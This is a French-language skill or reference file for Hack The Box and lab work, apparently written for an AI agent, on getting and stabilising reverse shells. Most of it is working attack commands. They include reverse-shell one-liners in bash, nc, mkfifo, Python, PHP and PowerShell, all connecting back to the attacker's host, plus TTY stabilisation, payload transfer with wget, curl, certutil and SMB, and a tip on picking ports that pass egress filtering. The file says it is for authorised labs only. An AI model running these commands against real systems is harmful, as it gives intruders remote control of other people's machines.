---
name: htb-shells
description: >
  Obtention et stabilisation de reverse/bind shells sur une box HTB/lab autorisé.
  À déclencher juste après avoir trouvé une exécution de commande ou un point
  d'injection, ou quand un shell obtenu est instable. Couvre : listeners
  (nc, socat, pwncat), one-liners reverse shell (bash, python, php, powershell,
  nc), upgrade d'un shell TTY interactif, et transfert de fichiers vers la cible.
  Produit un shell interactif stable prêt pour l'énumération.
metadata:
  type: reference
  category: shells
  legal: "Cibles autorisées uniquement (HTB, labs, CTF, systèmes vous appartenant)."
---

# HTB — Reverse shells & stabilisation

## Quand utiliser cette skill
Vous pouvez exécuter une commande sur la cible (RCE, webshell, injection) et
voulez un shell interactif chez vous. `LHOST` = votre IP VPN (`tun0`).

## 1) Mettre un listener chez soi
```bash
LHOST=$(ip -4 -o addr show tun0 | awk '{print $4}' | cut -d/ -f1); LPORT=4444
# simple
nc -lvnp $LPORT
# meilleur (auto-stabilise, historique) :
pwncat-cs -lp $LPORT
```

## 2) Déclencher le reverse shell (côté cible)
```bash
# Bash
bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1
# nc classique / mkfifo si -e absent
nc $LHOST $LPORT -e /bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LHOST $LPORT >/tmp/f
# Python
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("'$LHOST'",'$LPORT'));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'
# PHP
php -r '$s=fsockopen("'$LHOST'",'$LPORT');exec("/bin/sh -i <&3 >&3 2>&3");'
```
```powershell
# PowerShell (Windows)
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('LHOST',LPORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([Text.Encoding]::ASCII).GetBytes($r+'PS>');$s.Write($sb,0,$sb.Length)}"
```
> Astuce : `revshells.com` ou pwncat génèrent ces one-liners tout prêts.

## 3) Stabiliser un shell Linux (TTY complet)
```bash
# dans le shell distant
python3 -c 'import pty;pty.spawn("/bin/bash")'   # ou python / script -qc /bin/bash /dev/null
export TERM=xterm
# Ctrl+Z pour revenir chez soi, puis :
stty raw -echo; fg          # (entrée)
# vérifier la taille du terminal
stty rows 50 cols 200
```
Avec `pwncat-cs`, la stabilisation est automatique (Ctrl+D pour la console locale).

## 4) Transférer des fichiers vers la cible
```bash
# Chez soi : serveur HTTP
python3 -m http.server 80
# Cible Linux
wget http://$LHOST/linpeas.sh -O /tmp/linpeas.sh
curl http://$LHOST/tool -o /tmp/tool
# Cible Windows
certutil -urlcache -f http://LHOST/nc.exe nc.exe
powershell -c "iwr http://LHOST/winpeas.exe -o winpeas.exe"
# Via SMB (impacket) pour Windows
impacket-smbserver share . -smb2support
#   copy \\LHOST\share\file.exe .
```

## Réflexes
- Toujours stabiliser avant de travailler sérieusement (sinon Ctrl+C tue le shell).
- Écrire dans un dossier inscriptible : `/tmp`, `/dev/shm`, `C:\Windows\Temp`.
- Si le port 4444 est filtré, utiliser 80/443/53 (souvent autorisés en sortie).
- Ensuite : `htb-privesc`.
